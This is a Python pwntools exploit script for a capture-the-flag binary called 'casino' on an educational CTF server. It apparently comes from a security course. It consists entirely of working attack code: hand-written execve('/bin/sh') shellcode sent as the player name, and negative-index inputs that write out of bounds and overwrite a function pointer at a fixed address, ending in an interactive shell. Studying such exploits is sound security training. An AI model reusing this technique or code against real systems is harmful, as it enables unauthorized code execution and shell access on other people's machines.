from pwn import *

local = False
elf = 'casino' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10172
    r = remote(ip,port)

context.arch = 'amd64'
shellcode = asm('''
    push 0
    mov rsi,0x68732f2f6e69622f
    push rsi
    mov rdi,rsp
    xor rsi,rsi
    xor rax, rax
    xor rdx,rdx
    mov rax,59
    syscall
''')

age = "826851377" #0x3148c031
wrong = ["99", "99", "99", "99", "99", "99"]
lottery = ["58", "82", "54", "32", "40", "54"]
#raw_input("aaa")

r.recvuntil('name:')
r.sendline(shellcode)
r.recvuntil('Your age:')
r.sendline(age)
for i in range(6) :
    print r.recvuntil(':')
    r.sendline(wrong[i])
print r.recvuntil('Change the number? [1:yes 0:no]:')
r.sendline("1")
print r.recvuntil(':')
r.sendline("-42")
# r.sendline("1")
print r.recvuntil(':')
r.sendline("0")

for j in range(6) :
    print r.recvuntil(':')
    r.sendline(lottery[j])
print r.recvuntil('Change the number? [1:yes 0:no]:')
r.sendline("1")
print r.recvuntil(':')
r.sendline("-43")
print r.recvuntil(':')
r.sendline("6299888") #0x6020f0

r.interactive()
